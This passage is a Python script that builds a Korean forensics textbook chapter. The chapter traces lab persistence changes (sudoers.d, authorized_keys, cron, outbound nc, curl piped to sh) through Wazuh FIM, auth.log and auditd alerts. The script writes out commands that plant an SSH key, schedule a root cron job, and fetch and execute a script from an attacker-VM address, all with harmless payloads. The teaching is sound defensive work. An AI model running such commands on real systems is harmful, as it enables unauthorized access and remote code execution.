"""REV01 · 9장 지속성 흔적과 시스템 변경 조사. 저자용이며 실습 명령을 실행하지 않는다.

2026-11-06 개정 기준
- 조사 질문: 다시 들어오거나 다시 실행할 수단이 남았는가, 무엇이 바뀌었는가. 실습 22~28의 변경을 만들고
  FIM·auth.log·auditd 세 기록으로 다시 묶는다(9.9).
- 결과 값·화면은 2026-11-03 실제 kt66 실행 기록(editorial/evidence/chapter09/2026-11-03, kt66 .107 · 공격자 .108)이다.
- 독자 절차는 변경 흔적을 관찰하는 데 필요한 최소 동작으로 줄였다. sudoers 실습 파일은 주석만 담고, cron은 로컬 명령
  하나를 실행하며, 외부 연결은 문자열 한 줄만 보낸다. 기록과 다른 값(파일 크기·세션 구성)은 본문에서 기록 값으로 인용하지
  않는다. 셸 연결·원격 내려받기를 cron에 넣은 기록의 원래 절차는 본문에 옮기지 않았다.
- kt66 사실(bastion·web·kt66-host의 FIM 감시 경로와 check_all, host auditd 규칙, host-sensors.sh의 에이전트 등록)은
  기준 커밋 소스와 대조했다. 규칙은 Wazuh v4.10.0 ruleset과 대조했다.
"""
import json
from pathlib import Path
ROOT=Path(__file__).resolve().parents[1]
OUT=ROOT/'manuscript/REV01'
EX=ROOT/'examples/rev01/chapter09'
COMMIT='63d4180b1d6866de986ef263a3bd831d6082b5d5'
KT66='https://github.com/mrgrit/kt66/blob/'+COMMIT
WZ='https://github.com/wazuh/wazuh/blob/v4.10.0/ruleset'
pages=[];commands=[];queries=[]

def p(t): return {'type':'p','text':t}
def h(t): return {'type':'h','text':t}
def ul(*items): return {'type':'list','items':list(items)}
def ol(*items): return {'type':'list','style':'number','items':list(items)}
def tab(head,rows,widths=None,keep=False):
    b={'type':'table','head':head,'rows':rows,'widths':widths}
    if keep:b['keep']=True
    return b
def img(path,caption,width=127): return {'type':'image','path':path,'caption':caption,'width_mm':width}
def screen(name,caption,width=90): return img(f'assets/screens/chapter09/{name}.png',caption,width)
def box(kind,*text): return {'type':'box','kind':kind,'text':list(text)}
def code(t): return {'type':'code','text':t}
def link(text,url): return {'type':'link','text':text,'url':url}
HOST='kt66 VM · 터미널';BAS='kt66-bastion · root 관리 셸';ATT='공격자 VM · 터미널'
CCC='bastion · ccc SSH 셸';WEB='kt66-web · root 관리 셸';SIEM='kt66-siem 컨테이너 · 셸'
def c(text,purpose,syntax,result,where):
    b={'type':'command','id':f'C09-{len(commands)+1:02d}','where':where,'purpose':purpose,'text':text,'syntax':syntax,'result':result}
    commands.append(b);return b
def q(text,purpose,syntax,result,index='wazuh-alerts-*',qid=None,where=None):
    n=len([x for x in queries if x['id'].startswith('Q')])+1
    b={'type':'query','id':qid or f'Q09-{n:02d}','where':where or 'Windows · Discover · '+index,'purpose':purpose,'text':text,'syntax':syntax,'result':result}
    queries.append(b);return b
def page(title,*blocks,brk=True,level='page'):
    pg={'title':title,'kind':'body','blocks':list(blocks)}
    if not brk:pg['break']=False
    if level!='page':pg['level']=level
    pages.append(pg)
def section(title,*blocks):page(title,*blocks,brk=False,level='section')
FIG='assets/figures/chapter09/'
KT='192.168.0.189';AT='192.168.0.202'
ASH='#!/bin/sh\necho "book09-pipe user=$(id -un) host=$(hostname)"'
DEVTOOLS='''GET wazuh-alerts-*/_search
{
  "size": 0,
  "query": {"bool": {"filter": [
    {"term": {"rule.groups": "syscheck"}},
    {"range": {"timestamp": {
      "gte": "2026-11-03T07:45:00+09:00",
      "lte": "2026-11-03T08:05:00+09:00"}}}
  ]}},
  "aggs": {"by_path": {
    "terms": {"field": "syscheck.path", "size": 30},
    "aggs": {"by_event": {"terms": {"field": "syscheck.event"}}}
  }}
}'''

# ── 장 도입 ───────────────────────────────────────────────────
page('9장  지속성 흔적과 시스템 변경 조사',
    p('8장에서 한 출발지가 ccc로 로그인해 sudo를 쓴 것을 확인했다. 대응 담당자가 ccc의 암호를 바꾸면 사건이 끝날까? 그 세션이 SSH 공개 키를 등록했거나 예약 작업을 만들었다면 암호와 상관없이 다시 들어오거나 다시 실행할 수 있다. 이렇게 처음 접속이 끝난 뒤에도 접근이나 실행을 되풀이할 수 있게 남겨 둔 조건을 지속성이라고 한다. 조사 질문은 두 가지이다. 다시 들어오거나 다시 실행할 수단이 남았는가. 그 밖에 무엇이 바뀌었는가.'),
    p('9장의 앞부분에서는 공격자가 흔히 바꾸는 자리에 실습 표식만 담은 변경을 만든다. sudo 규칙 파일, SSH 공개 키, 예약 작업, 외부 연결, 내려받은 스크립트 실행, 실행 파일, 로그이다. 뒷부분에서는 파일 무결성 감시(FIM), 인증 기록, 호스트 명령 감사의 세 기록을 시각으로 묶어 누가 무엇을 남겼는지 재구성한다. Module 01 실습 22~28에 해당한다.'),
    h('학습 목표'),
    ul('sudoers.d·authorized_keys·cron.d·실행 파일·로그의 변경이 FIM 경보(554·550·553)에 어떻게 남는지 확인하고, diff와 변경 전후 값으로 무엇이 바뀌었는지 읽는다.',
       '호스트 감사(auditd) 경보에서 실행 파일·인자·로그인 사용자(auid)·부모 프로세스를 읽고, 같은 세션의 명령으로 실행 관계를 재구성한다.',
       'FIM·인증·감사 기록을 시각으로 이어 변경을 만든 세션을 찾고, 감시 범위 밖이라 기록이 없는 변경을 구분한다.'),
    img(FIG+'rev01-roadmap.png','도식 9-1. 9장 학습 순서.',110),
    h('준비와 완료 기준'),
    tab(['항목','내용'],[
        ['실행 위치','공격자 VM 터미널, kt66 VM 터미널(bastion·web 관리 셸), Windows 브라우저'],
        ['선행 조건','8장의 bastion 접속과 ccc의 sudo 권한, 6.6의 필드 분포와 Dev Tools'],
        ['완료 기준','9.9의 정리 표에 변경마다 경로·시각·변경 내용·만든 세션과 근거를 채운다.'],
        ['결과가 다를 때','9.11의 증상별 확인 순서를 따른다.'],
        ['원상복구','각 절의 원상복구와 9.11의 최종 확인']],[30,97],keep=True),
    box('field','본문의 결과 값과 화면은 2026년 11월 3일의 실행 기록이다. 그 환경의 kt66 VM은 192.168.0.107, 공격자 VM은 192.168.0.108이었다. 본문 예시값으로는 각각 192.168.0.189와 192.168.0.202이다. 시각·프로세스 번호·세션 번호·해시는 실행할 때마다 달라진다.'))

# ── 9.1 ──────────────────────────────────────────────────────
section('9.1  감시 범위 확인',
    p('FIM(File Integrity Monitoring)은 지정한 경로의 파일을 기준 상태와 비교해 추가·변경·삭제를 보고하는 Wazuh 에이전트 기능이다. 설정 이름은 syscheck이다. realtime은 운영체제의 변경 알림으로 즉시 검사하고, report_changes는 텍스트 파일의 바뀐 줄(diff)을 경보에 붙인다. 감시 경로 밖의 변경은 기록되지 않으므로 먼저 범위를 확인한다. [1][2]'),
    img(FIG+'rev01-sources.png','도식 9-2. 변경을 보는 세 가지 기록.'),
    c('docker exec -it kt66-bastion /bin/bash',
      'bastion 관리 셸로 들어간다.',
      '컨테이너 안의 셸로 들어가는 형식(5.4)이다. 이 창을 9.8까지 bastion 관리 셸로 쓴다.',
      '프롬프트가 root@bastion으로 바뀐다.',HOST),
    c("grep -n '<directories' /var/ossec/etc/ossec.conf\nls -l /etc/sudoers.d/99-book09-lab \\\n  /etc/cron.d/book09-lab /var/log/book09-btmp\nls -ld /home/ccc/book09-history",
      'bastion의 FIM 감시 경로를 읽고, 실습에 쓸 경로가 비어 있는지 확인한다.',
      'grep -n은 일치한 줄을 줄 번호와 함께 출력한다. 작은따옴표는 꺾쇠(<)를 셸의 입력 방향 기호가 아닌 글자로 넘긴다. ls -ld는 디렉터리 자체의 정보를 보인다.',
      '기본 감시 경로(/etc, /usr/bin 등)와 kt66이 더한 줄이 나온다. kt66 줄에는 /etc/sudoers.d, /etc/cron.d, /home/ccc가 realtime="yes" report_changes="yes"로, /var/log가 realtime="yes" check_all="no"로 있다. 실습 경로는 모두 No such file or directory여야 한다. 하나라도 있으면 내용을 확인하고 다른 이름을 정한다.',BAS),
    p('check_all="no"는 크기·해시·권한 같은 속성을 비교하지 않는다는 뜻이다. bastion의 /var/log는 파일의 추가와 삭제만 보고하고, 내용이 바뀌거나 비워져도 550을 내지 않는다. 9.8에서 이 차이를 확인한다. [1]'),
    c('visudo -c',
      'sudo 정책 파일 전체의 문법과 권한을 검사한다.',
      'visudo는 sudo 정책을 검사하고 편집하는 도구이며 -c는 검사만 한다. 9.2에서 파일을 더한 뒤 같은 검사로 정책이 깨지지 않았는지 확인한다.',
      '/etc/sudoers: parsed OK와 /etc/sudoers.d/ccc: parsed OK가 나온다. /etc/sudoers.d/ccc: bad permissions, should be mode 0440이 나오면 다음 명령으로 권한만 바로잡는다.',BAS),
    c('ls -l /etc/sudoers.d/ccc\nchmod 0440 /etc/sudoers.d/ccc\nvisudo -c',
      '(권한 오류가 나온 경우만) 기존 ccc 규칙 파일의 권한을 sudo가 요구하는 값으로 바꾼다.',
      'chmod 0440은 소유자와 그룹만 읽을 수 있게 한다. 내용은 바꾸지 않는다.',
      'ls에 -rw-r--r-- 1 root root가 보이고, 마지막 검사에서 모든 파일이 parsed OK이다. 바꾼 권한은 사건 노트에 적는다.',BAS),
    h('kt66-host 에이전트와 명령 감사'),
    p('9.5·9.6의 명령은 kt66 VM(호스트)에서 실행하고 호스트의 auditd가 기록한다. auditd는 Linux 커널의 감사 이벤트를 /var/log/audit/audit.log에 쓰는 서비스이다. kt66은 설치할 때 호스트에 Wazuh 에이전트(kt66-host)와 auditd 규칙을 둔다. [3]'),
    c('sudo /var/ossec/bin/wazuh-control status\nsudo auditctl -l',
      '호스트 에이전트 상태와 적용 중인 감사 규칙을 확인한다.',
      '다른 kt66 VM 터미널 창에서 실행한다. auditctl -l은 커널에 적용된 감사 규칙을 출력한다.',
      'wazuh-agentd is running…과 -a always,exit -F arch=b64 -S execve -F auid>=1000 -F auid!=-1 -F key=audit-wazuh-c 형식의 줄(b32 줄도 있다)이 나온다. wazuh-agentd not running…이면 다음 명령으로 등록 상태를 확인한다.',HOST),
    c('sudo wc -l /var/ossec/etc/client.keys\nsudo /var/ossec/bin/agent-auth -m 10.20.32.100 -A kt66-host\nsudo systemctl restart wazuh-agent',
      '(에이전트가 멈춰 있는 경우만) 등록 키가 없으면 Manager에 등록하고 에이전트를 시작한다.',
      'client.keys는 에이전트 등록 키 파일이다. wc -l은 줄 수만 세며 키 내용은 출력하지 않는다. 0이면 등록되지 않은 것이다. agent-auth의 -m은 Manager 주소(kt66 기본 10.20.32.100), -A는 에이전트 이름이다. 1 이상이면 둘째 줄은 건너뛴다.',
      'agent-auth가 Valid key received를 출력한다. Wazuh 메뉴 Agents에서 kt66-host가 Active인지 확인한다.',HOST),
    p('규칙의 auid는 로그인할 때 정해지는 사용자 번호이며 sudo로 권한이 바뀌어도 유지된다. auid>=1000은 로그인한 일반 계정에서 시작한 실행만 모은다. 호스트의 서비스나 컨테이너 데몬이 만든 실행은 auid가 없어 빠진다.'),
    c('ls -ld ~/book09\nmkdir ~/book09\ncd ~/book09\npwd',
      '공격자 VM에 실습 디렉터리를 만든다.',
      'ls -ld로 같은 이름이 이미 있는지 보고, mkdir로 만들고, cd로 들어가 pwd로 현재 위치를 확인한다.',
      '첫 줄은 No such file or directory, 마지막 줄은 /home/계정/book09이다.',ATT),
    c(f'ssh -p 2204 ccc@{KT}',
      '공격자 VM에서 bastion에 ccc로 로그인한다.',
      '-p 2204는 bastion으로 연결되는 kt66 VM의 포트이고, 암호는 bastion의 기본값 ccc이다. 이 셸을 9.4까지와 9.8에서 쓴다.',
      'ccc@bastion 프롬프트가 나온다. 시각을 공격 일지에 적는다.',ATT))

# ── 9.2 ──────────────────────────────────────────────────────
section('9.2  sudo 규칙 파일',
    p('실습 22. sudo는 /etc/sudoers와 /etc/sudoers.d/의 파일을 모두 읽어 정책을 만든다. 이 디렉터리에 파일 한 줄이 생기면 어떤 계정이 암호 없이 root로 명령을 실행할 수 있게 된다. kt66이 만든 /etc/sudoers.d/ccc(C09-04)가 그 형식이다. 공격자가 ccc의 sudo 권한으로 다른 계정에 같은 규칙을 주면 ccc가 막혀도 그 계정으로 권한을 쓴다. 실습 파일에는 주석만 넣어 정책은 바꾸지 않고 파일 변경만 관찰한다. [4]'),
    c("printf '%s\\n' '# book09 lab' | \\\n  sudo tee /etc/sudoers.d/99-book09-lab\nsudo chmod 0440 /etc/sudoers.d/99-book09-lab\nsudo visudo -c",
      'sudoers.d에 주석 한 줄짜리 실습 파일을 만든다.',
      'printf의 %s는 인자 하나, \\n은 줄바꿈이다. 셸의 파이프(|)가 출력을 tee로 넘기고, tee는 받은 내용을 화면과 파일에 함께 쓴다. sudo는 tee에 적용되므로 root만 쓸 수 있는 경로에 파일이 생긴다. #로 시작하는 줄은 sudoers에서 주석이다.',
      '# book09 lab이 한 번 출력되고, 검사에서 99-book09-lab: parsed OK를 포함해 모든 파일이 정상이다. 시각을 공격 일지에 적는다.',CCC),
    q('agent.name: "bastion" AND\nsyscheck.path: "/etc/sudoers.d/99-book09-lab"',
      '실습 파일의 FIM 경보를 찾는다.',
      'syscheck.path는 바뀐 파일의 전체 경로이다. 경로는 큰따옴표로 묶는다.',
      '554(File added to the system), syscheck.event added가 나온다. 기록에서는 07:49:34였다.'),
    c("printf '%s\\n' '# book09 checked' | \\\n  sudo tee -a /etc/sudoers.d/99-book09-lab\nsudo visudo -c",
      '같은 파일 끝에 주석 한 줄을 더한다.',
      'tee -a는 덮어쓰지 않고 파일 끝에 덧붙인다.',
      '주석이 출력되고 검사가 정상이다. Q09-01을 다시 검색하면 550이 하나 더 있다.',CCC),
    screen('sudoers-fields','화면 9-1. sudoers 실습 파일 수정 경보의 diff와 바뀐 속성.'),
    p('syscheck.diff의 1a2는 이전 파일 1행 뒤에 새 파일의 2행이 더해졌다는 뜻이고, >로 시작하는 줄이 더해진 내용이다. 이 >는 diff의 표시이며 셸의 출력 방향 기호와 다르다. changed_attributes에는 size, mtime(수정 시각)과 해시 세 가지가 있다. size_before·size_after는 더한 17바이트만큼 차이가 난다. uname_after root는 바뀐 뒤 파일의 소유자이다. 파일을 바꾼 계정은 같은 시각의 sudo 기록에서 찾는다.'),
    q('agent.name: "bastion" AND rule.groups: "sudo"\nAND data.command: *99-book09-lab*',
      '실습 파일을 대상으로 한 sudo 명령을 찾는다.',
      '값 앞뒤의 *는 그 사이에 문자열이 들어 있는 값을 고른다(따옴표 없이 쓴다). data.srcuser, data.command 열을 추가한다.',
      'data.srcuser ccc, data.command /usr/bin/tee /etc/sudoers.d/99-book09-lab과 /usr/bin/chmod 0440 …, /usr/bin/tee -a …가 FIM 경보와 같은 초에 나온다. sudo 요청 계정이 ccc이고 그 세션이 실습 SSH 세션이다.'),
    c('sudo cat /etc/sudoers.d/99-book09-lab\nsudo rm /etc/sudoers.d/99-book09-lab\nsudo visudo -c',
      '(원상복구) 실습 파일 내용을 확인하고 지운다.',
      'cat으로 지울 파일이 실습 파일인지 확인한 뒤 rm으로 그 파일만 지운다.',
      '두 주석 줄이 보이고, 지운 뒤 검사에서 99-book09-lab 줄이 사라진다. Q09-01에 553(File deleted)이 더해진다.',CCC),
    box('field','실제 사건에서 sudoers.d의 554·550을 찾았다면 경보만 보고 파일을 지우지 않는다. diff나 파일 내용을 먼저 보존하고, 그 줄이 어떤 계정에 무엇을 허용하는지 읽은 뒤 정책 승인 기록과 대조한다.'))

# ── 9.3 ──────────────────────────────────────────────────────
section('9.3  SSH 공개 키',
    p('실습 23. 공개 키 인증은 접속자가 가진 개인 키와 서버 계정의 ~/.ssh/authorized_keys에 등록된 공개 키가 짝일 때 암호 없이 로그인을 허용한다. 공격자가 자기 공개 키 한 줄을 이 파일에 더하면 계정 암호를 바꿔도 같은 개인 키로 다시 들어온다. 실습용 키 한 쌍을 만들어 등록하고, 로그인하고, 원래 파일로 되돌린다. [5]'),
    c("ssh-keygen -t ed25519 -N '' -C book09-lab \\\n  -f ~/book09/book09_key\nssh-keygen -lf ~/book09/book09_key.pub\ncat ~/book09/book09_key.pub",
      '공격자 VM에 실습용 키 한 쌍을 만들고 지문과 공개 키를 확인한다.',
      'ssh-keygen -t는 키 종류, -N 뒤의 빈 따옴표는 개인 키 암호 없음, -C는 키 끝에 붙는 설명, -f는 저장할 파일 이름이다. .pub가 붙은 파일이 공개 키이다. -l은 지문을 출력한다.',
      '256 SHA256:… book09-lab (ED25519) 지문과 ssh-ed25519 AAAA… book09-lab 한 줄이 나온다. 지문을 공격 일지에 적는다. 개인 키(book09_key)는 공격자 VM 밖으로 옮기지 않는다.',ATT),
    c('cd /home/ccc/.ssh\nls -l authorized_keys /root/book09-ak.before\ncp -p authorized_keys /root/book09-ak.before\ncmp authorized_keys /root/book09-ak.before',
      'ccc의 현재 공개 키 목록을 백업한다.',
      'cp -p는 권한·소유자·시각을 유지해 복사하고, cmp는 두 파일이 같으면 아무것도 출력하지 않는다.',
      'ls에 -rw------- 1 ccc ccc … authorized_keys가 나오고 백업 이름은 No such file or directory이다. cmp는 출력이 없다. authorized_keys가 처음부터 없다면 백업은 건너뛰고, 원상복구 때 이번에 생긴 파일을 지운다.',BAS),
    c('cat >> /home/ccc/.ssh/authorized_keys',
      '공개 키 한 줄을 ccc의 authorized_keys 끝에 더한다.',
      '>>는 파일 끝에 덧붙인다. 명령을 실행하면 cat이 입력을 기다린다. C09-12에서 출력한 ssh-ed25519로 시작하는 한 줄 전체를 붙여 넣고 Enter를 누른 뒤, 빈 줄에서 Ctrl+D로 입력을 끝낸다.',
      '프롬프트로 돌아온다. tail -n 1 /home/ccc/.ssh/authorized_keys로 마지막 줄이 붙여 넣은 공개 키인지 확인한다.',CCC),
    c(f'ssh -p 2204 -i ~/book09/book09_key \\\n  -o IdentitiesOnly=yes -o PasswordAuthentication=no \\\n  ccc@{KT} hostname',
      '등록한 키로만 로그인해 명령 하나를 실행한다.',
      '-i는 쓸 개인 키, IdentitiesOnly=yes는 그 키만 쓰게 하고, PasswordAuthentication=no는 암호 인증으로 넘어가지 않게 한다. 마지막 hostname은 로그인한 뒤 실행할 명령이다.',
      '암호를 묻지 않고 bastion이 출력된다. Permission denied (publickey)이면 붙여 넣은 줄이 잘렸거나 다른 키이다.',ATT),
    q('agent.name: "bastion" AND\nsyscheck.path: "/home/ccc/.ssh/authorized_keys"',
      '키 목록 변경을 찾는다.',
      '경보를 펼쳐 syscheck.diff, size_before, size_after를 읽는다.',
      '550이 나오고 diff는 1a2와 > ssh-ed25519 AAAA… book09-lab이다. 기록에서는 07:50:21에 99바이트가 196바이트가 되었다.'),
    q('agent.name: "bastion" AND rule.id: "5715"\nAND full_log: "Accepted publickey"',
      '공개 키 인증 성공을 찾는다.',
      'full_log의 문구로 암호 인증(Accepted password)과 구분한다.',
      'full_log 끝에 ssh2: ED25519 SHA256:…가 있다. 이 값이 C09-12의 지문과 같으면 등록한 키로 로그인한 것이다.'),
    screen('publickey-fields','화면 9-2. 공개 키 로그인의 계정·출발지·출발지 포트.',75),
    p('FIM의 해시(sha256_after)와 SSH 키 지문(SHA256:…)은 둘 다 SHA-256이지만 계산 대상이 다르다. 앞은 authorized_keys 파일 전체, 뒤는 공개 키 하나이다. 키 끝의 book09-lab은 키를 만든 사람이 마음대로 쓰는 설명이므로 누구의 키인지 증명하지 않는다. 등록과 로그인을 잇는 근거는 diff의 공개 키와 5715 원문의 지문이 같은 키라는 사실이다.'),
    c('cd /home/ccc/.ssh\ncp -p /root/book09-ak.before authorized_keys\ncmp /root/book09-ak.before authorized_keys',
      '(원상복구) 공개 키 목록을 백업 내용으로 되돌린다.',
      'C09-13의 복사 방향을 바꾼 것이다.',
      'cmp는 출력이 없다. C09-15를 다시 실행하면 Permission denied (publickey)로 끝난다. 백업 파일은 9.11에서 지운다.',BAS),
    box('blind','authorized_keys에 키를 더한 기록은 FIM에, 그 키의 로그인은 auth.log에 남는다. 이미 열린 SSH 세션은 키를 지워도 끊어지지 않는다. 키를 지우는 대응에는 해당 계정의 열린 세션 확인과 종료가 따른다.'))

# ── 9.4 ──────────────────────────────────────────────────────
section('9.4  예약 작업',
    p('실습 24. cron은 정해진 시각에 명령을 반복 실행하는 서비스이다. /etc/cron.d/의 파일은 한 줄에 시간 다섯 칸(분 시 일 월 요일), 실행 계정, 명령을 적는다. 다섯 칸이 모두 *이면 매분이다. 공격자는 여기에 외부에서 내용을 받아 root로 실행하는 줄을 넣어 반복 실행 수단을 남긴다. 실습 파일에는 실행 계정 이름을 결과 파일에 적는 명령만 넣는다. [6]'),
    c('command -v cron\nservice cron status',
      'bastion에 cron이 있고 실행 중인지 확인한다.',
      'command -v는 명령의 경로를 출력한다. service 이름 status는 서비스 상태를 출력한다.',
      '/usr/sbin/cron과 cron is running이 나오면 C09-19로 간다. 출력이 없거나 cron: unrecognized service이면 다음 명령으로 설치한다. 처음 상태를 사건 노트에 적는다.',BAS),
    c('apt-get update\napt-get install -y --no-install-recommends cron\nservice cron start',
      '(cron이 없는 경우만) cron을 설치하고 시작한다.',
      'apt-get update는 패키지 목록을 갱신하고, install -y는 확인 없이 설치한다. --no-install-recommends는 추천 패키지를 함께 설치하지 않는다.',
      '설치가 끝나고 Starting periodic command scheduler cron …이 나온다. 기록 환경도 cron이 없어 이 단계를 거쳤다.',BAS),
    c("printf '%s\\n' \\\n  '* * * * * root id -un >> /tmp/book09-cron-result' \\\n  | sudo tee /etc/cron.d/book09-lab",
      '매분 실행되는 실습 예약 작업을 만든다.',
      '작은따옴표가 *와 >>를 지금의 셸이 해석하지 않게 묶는다. 파일 안의 >>는 cron이 실행할 때 결과 파일 끝에 덧붙이는 기호이다. id -un은 실행 계정 이름을 출력한다.',
      '한 줄이 출력되고 파일이 생긴다. 시각을 공격 일지에 적는다.',CCC),
    q('agent.name: "bastion" AND\nsyscheck.path: "/etc/cron.d/book09-lab"',
      '예약 작업 파일의 생성을 찾는다.',
      'Q09-01과 같은 형식이다.',
      '554가 나온다. 기록에서는 07:51:42였다. 추가 경보에는 diff가 없다.'),
    c('date\ncat /tmp/book09-cron-result\ngrep book09 /var/log/syslog | tail -n 2',
      '다음 분이 지난 뒤 예약 작업이 실제로 실행되었는지 확인한다.',
      'date로 분이 바뀌었는지 본다. cron은 실행한 명령을 syslog에 남기며, grep으로 실습 파일 이름이 든 줄을 찾는다.',
      '결과 파일에 root가 한 줄 이상 있고, syslog에 CRON[…]: (root) CMD (id -un >> /tmp/book09-cron-result) 줄이 있다. 결과 파일이 없으면 C09-17의 서비스 상태와 파일 한 줄의 형식을 확인한다.',CCC),
    p('554는 예약 작업이 등록되었다는 기록이고, 실행되었다는 기록이 아니다. 실행 근거는 결과 파일과 cron의 실행 기록이다. cron이 실행한 명령 줄(CMD)은 syslog에 남는다. auth.log에는 cron 세션의 열림·닫힘만 남으므로 auth.log 경보로는 무엇을 실행했는지 알 수 없다. 추가 경보에는 내용 차이가 붙지 않으므로, 실제 사건에서는 파일을 지우기 전에 내용을 읽고 보존한다. 명령 줄에 curl·wget과 파이프가 있으면 외부에서 받은 내용을 실행하는 작업이다.'),
    c('sudo cat /etc/cron.d/book09-lab\nsudo rm /etc/cron.d/book09-lab /tmp/book09-cron-result\nls -l /etc/cron.d/book09-lab /tmp/book09-cron-result',
      '(원상복구) 예약 작업과 결과 파일을 지운다.',
      '지울 파일 내용을 확인한 뒤 두 파일만 지운다.',
      'ls가 두 경로 모두 No such file or directory를 출력한다. Q09-05에 553이 더해진다. 1분 뒤 결과 파일이 다시 생기지 않는지 확인한다.',CCC),
    screen('cron-fields','화면 9-3. 예약 작업 파일 삭제 경보.',90),
    p('C09-17에서 cron이 원래 멈춰 있었다면 bastion 관리 셸에서 service cron stop으로 처음 상태로 돌린다. 설치한 패키지는 남겨 둔다. 예약 파일을 지우면 다음 실행이 멈추지만 이미 실행 중인 프로세스는 계속된다.'))

# ── 9.5 ──────────────────────────────────────────────────────
section('9.5  외부 연결 실행 기록',
    p('실습 25. 침입한 프로세스가 공격자 쪽으로 연결을 여는 것은 내부에서 밖으로 나가는 통로를 만드는 동작이다. 리버스 셸은 이렇게 연 연결에 셸의 입력과 출력을 붙인 것이다. 호스트에서 이런 연결을 여는 프로그램이 실행되면 auditd가 실행 파일과 인자를 기록한다. 실습에서는 kt66 VM의 ccc가 nc로 공격자 VM에 문자열 한 줄만 보낸다. nc(netcat)는 TCP 연결을 열거나 받아 표준 입력·출력과 이어 주는 도구이다. [7]'),
    c('timeout 120s nc -lvn 4444',
      '공격자 VM에서 4444 포트로 연결을 기다린다.',
      '-l은 연결 대기, -v는 상태 출력, -n은 이름 조회 생략이다. timeout 120s는 120초가 지나면 멈춘다.',
      'Listening on 0.0.0.0 4444가 나온다. 이 창을 그대로 두고 다음 명령을 kt66 VM에서 실행한다.',ATT),
    c(f"printf 'book09-nc\\n' | nc -N {AT} 4444",
      'kt66 VM에서 공격자 VM으로 연결해 문자열 한 줄을 보낸다.',
      'printf의 출력이 파이프로 nc에 들어간다. -N은 입력이 끝나면 연결을 닫는다. 주소는 자신의 공격자 VM 주소로 바꾼다.',
      '공격자 창에 Connection received on (kt66 VM 주소) …와 book09-nc가 나오고 두 쪽 모두 끝난다. 시각을 공격 일지에 적는다.',HOST),
    q('agent.name: "kt66-host" AND\nrule.groups: "audit_command" AND\ndata.audit.execve.a0: "nc"',
      '호스트에서 실행된 nc의 감사 경보를 찾는다.',
      'audit_command는 명령 실행 감사 경보의 그룹이다. data.audit.execve.a0는 실행 인자의 첫 번째(프로그램 이름)이다.',
      '80792(Audit: Command: /usr/bin/nc.) 한 건이 나온다. 기록의 인자는 a1 -N, a2 192.168.0.108, a3 4444였다.'),
    screen('reverse-fields','화면 9-4. nc 실행 감사 경보의 사용자·실행 파일·인자.',80),
    tab(['필드','기록 값','뜻'],[
        ['data.audit.auid','1000','로그인 사용자 번호(ccc). sudo로 바뀌지 않는다.'],
        ['data.audit.euid','1000','실제 권한을 정하는 번호. root면 0'],
        ['data.audit.pid · ppid','172438 · 172435','이 프로세스와 부모 프로세스'],
        ['data.audit.session','82','로그인 세션 번호'],
        ['data.audit.cwd','/home/ccc','실행한 작업 디렉터리'],
        ['data.audit.execve.a0~a3','nc · -N · 주소 · 4444','실행 인자'],
        ['data.audit.success · exit','yes · 0','execve 호출의 성공']],[42,38,47],keep=True),
    p('success yes와 exit 0은 nc 프로그램이 시작되었다는 뜻이다. 연결이 이루어졌는지는 공격자 창의 Connection received가 근거이다. 인자의 주소와 포트는 연결하려 한 목적지이다. 보낸 문자열(book09-nc)은 감사 기록에 없다. printf가 셸 내장 명령이라 새 프로그램을 실행하지 않았고, auditd는 실행 인자만 기록하기 때문이다. 데이터 내용을 보려면 네트워크 기록이 필요하다.'),
    p('data.audit.exe는 /usr/bin/nc이지만 full_log의 SYSCALL 부분은 exe="/usr/bin/nc.openbsd"이다. Ubuntu의 nc는 nc.openbsd를 가리키는 링크이다. 실행 파일 이름 하나로 검색하면 이런 차이로 놓칠 수 있으므로 a0와 full_log를 함께 쓴다. 감사 원문은 kt66 VM에서 sudo ausearch -a 이벤트번호 -i로 다시 읽을 수 있다. 이벤트 번호는 data.audit.id이다.'))

# ── 9.6 ──────────────────────────────────────────────────────
section('9.6  내려받은 스크립트 실행',
    p('실습 26. curl로 받은 응답을 파이프로 sh에 넘기면 응답 내용이 바로 명령이 된다. 디스크에 스크립트 파일이 생기지 않으므로 FIM에는 남지 않는다. 남는 것은 curl과 sh의 실행 기록, 웹 서버의 요청 기록, 실행 결과이다. 사용자·호스트 이름만 출력하는 스크립트로 확인한다. [8]'),
    c("cat > a.sh <<'EOF'\n"+ASH+"\nEOF\ncat a.sh",
      '공격자 VM의 실습 디렉터리에 실행할 스크립트를 만든다.',
      '<<\'EOF\'부터 EOF만 있는 줄 앞까지가 cat의 입력이 된다(here-document). EOF를 작은따옴표로 묶어 지금은 $( )를 실행하지 않고 글자 그대로 저장한다. 스크립트가 실행될 때 $(id -un)과 $(hostname)이 그 시스템의 값으로 바뀐다.',
      '두 줄짜리 스크립트가 출력된다. ~/book09에서 실행했는지 pwd로 확인한다.',ATT),
    c(f'python3 -m http.server 8000 --bind {AT}',
      '현재 디렉터리를 HTTP로 제공한다.',
      'python3 -m http.server는 현재 디렉터리의 파일을 내려받게 하는 간이 웹 서버이다. --bind는 받을 주소이다.',
      'Serving HTTP on 192.168.0.202 port 8000 …이 나온다. 이 창을 그대로 둔다. 요청이 오면 GET /a.sh … 200 줄이 출력된다.',ATT),
    c(f'curl -fsS --max-time 5 http://{AT}:8000/a.sh',
      'kt66 VM에서 실행하지 않고 내용만 내려받아 읽는다.',
      'curl은 URL의 응답을 출력한다. -f는 HTTP 오류를 실패로 처리하고, -sS는 진행 표시를 숨기되 오류는 보인다. --max-time 5는 5초 제한이다.',
      'a.sh의 두 줄이 그대로 출력되고 서버 창에 GET /a.sh 200이 나온다.',HOST),
    c(f'curl -fsS --max-time 5 http://{AT}:8000/a.sh | sh\necho "${{PIPESTATUS[*]}}"',
      '내려받은 내용을 sh로 실행한다.',
      '파이프가 curl의 출력을 sh의 입력으로 넘긴다. PIPESTATUS는 직전 파이프의 각 명령 종료 코드를 담는 Bash 배열이며, [*]는 전체를 공백으로 이어 출력한다.',
      'book09-pipe user=ccc host=…(kt66 VM 이름)과 0 0이 나온다. 앞의 0이 curl, 뒤의 0이 sh이다. 응답이 비어도 sh는 0으로 끝나므로 curl의 코드와 출력을 함께 본다. 서버 창을 Ctrl+C로 닫고 공격 일지에 적는다.',HOST),
    q('agent.name: "kt66-host" AND\nrule.groups: "audit_command" AND\ndata.audit.execve.a0: "curl"',
      'curl 실행 기록을 찾는다.',
      'data.audit.execve 아래 인자를 모두 연다.',
      '두 건(내용 확인, 파이프 실행)이 나온다. 인자는 a1 -fsS, a2 --max-time, a3 5, a4 URL이다.'),
    screen('download-fields','화면 9-5. curl 실행 경보의 인자.',80),
